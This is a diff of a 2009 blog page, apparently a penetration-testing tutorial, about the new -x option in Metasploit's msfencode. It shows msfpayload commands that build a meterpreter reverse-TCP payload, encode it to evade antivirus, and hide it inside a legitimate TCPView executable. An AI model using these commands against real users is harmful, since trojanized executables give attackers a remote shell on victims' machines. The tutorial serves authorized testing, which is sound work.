@@ -9,7 +9,7 @@
 <meta name="description"
     content="In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.
 But before I get into the new feature, lets quickly go over the standard way you use msfencode:
-root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3#  We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload." />
+root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3# We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload." />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://malicious.link/post/2009/2009-11-03-metasploit-blends-in-new-msfpayloadencode/" />
@@ -29,7 +29,7 @@ root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_
     type="text/css">
 
 
-<link rel="stylesheet" href="https://malicious.link/scss/main.min.099699ab246bf26f50616f7c9f00c79d46110459d1bd727b2d07d6fc09ece082.css">
+<link rel="stylesheet" href="https://malicious.link/scss/main.min.48be1f41dc1d94d27b5663b2b359c895efd7696597f656e57d8f6c0e126c0563.css">
 
 
 
@@ -42,21 +42,18 @@ root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_
 <meta name="theme-color" content="#252627"><meta itemprop="name" content="Metasploit Blends in: New MSFPayload/ENcode">
 <meta itemprop="description" content="In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.
 But before I get into the new feature, lets quickly go over the standard way you use msfencode:
-root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3#  We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload.">
-
-
+root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3# We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload.">
 <meta itemprop="datePublished" content="2009-11-03T03:47:20&#43;00:00" />
 <meta itemprop="dateModified" content="2009-11-03T03:47:20&#43;00:00" />
 <meta itemprop="wordCount" content="232">
 
 
 
-<meta itemprop="keywords" content="" />
-<meta name="twitter:card" content="summary"/>
+<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary"/>
 <meta name="twitter:title" content="Metasploit Blends in: New MSFPayload/ENcode"/>
 <meta name="twitter:description" content="In Revision 7315 of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.
 But before I get into the new feature, lets quickly go over the standard way you use msfencode:
-root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3#  We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload."/>
+root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) root@bt4:/pentest/exploits/framework3# We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload."/>
 
 
 
@@ -130,31 +127,21 @@ root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_
 
             <div class="post-content">
                 <p>In <a href="https://metasploit.com/redmine/projects/framework/repository/revisions/7315">Revision 7315</a> of the Metasploit Framework (SVN) a new option was added to MSFENCODE. Technically you always had the ability to do the following, but it required a bit of knowledge of the inner workings of the framework.</p>
-
 <p>But before I get into the new feature, lets quickly go over the standard way you use msfencode:</p>
-
 <pre><code>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443 R | ./msfencode -t exe -o /tmp/bob.exe       
 [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) 
 
 root@bt4:/pentest/exploits/framework3#
-</code></pre>
-
-<p>We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload. We then piped it into MSFENCODE, so that we could output it as a proper Windows executable (/tmp/bob.exe), encoded to avoid AV detection.</p>
-
+</code></pre><p>We just used MSFPAYLOAD to output in [R]AW format, a reverse tcp connect meterpreter payload. We then piped it into MSFENCODE, so that we could output it as a proper Windows executable (/tmp/bob.exe), encoded to avoid AV detection.</p>
 <p>Now if you knew where it was (data/templates/template.exe) you could probably just replace the template.exe with the one you want loaded with the payload and called it a day. But then you wouldn’t get some of the tweaks that make this update awesome.</p>
-
 <p>The update added the (-x) option to msfencode. This allows you to specify an executable of your choosing to sacrifice to the gods. For example: (TCPView)</p>
-
 <pre><code>root@bt4:/pentest/exploits/framework3# ./msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.92.131 LPORT=443       
 R | ./msfencode -t exe -x /tmp/Tcpview.exe -o /tmp/Tcpview2.exe        
 [*] x86/shikata_ga_nai succeeded with size 318 (iteration=1) 
 
 root@bt4:/pentest/exploits/framework3#
-</code></pre>
-
-<p>And if everything went well, we have a nice new executable in /tmp/ called Tcpview2.exe. Want to know the magic part? Try to tell them apart:</p>
-
-<p><img src="/images/postimages/200911_msfencode_1.png" alt="" /></p>
+</code></pre><p>And if everything went well, we have a nice new executable in /tmp/ called Tcpview2.exe. Want to know the magic part? Try to tell them apart:</p>
+<p><img src="/images/postimages/200911_msfencode_1.png" alt=""></p>
 
             </div>
         </article>
@@ -176,7 +163,7 @@ root@bt4:/pentest/exploits/framework3#
                 <footer class="footer">
     <div class="footer__inner">
         <div class="footer__content">
-            <span>&copy; 2019</span>
+            <span>&copy; 2020</span>
             
             <span></span>
             <span> <a href="https://malicious.link/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
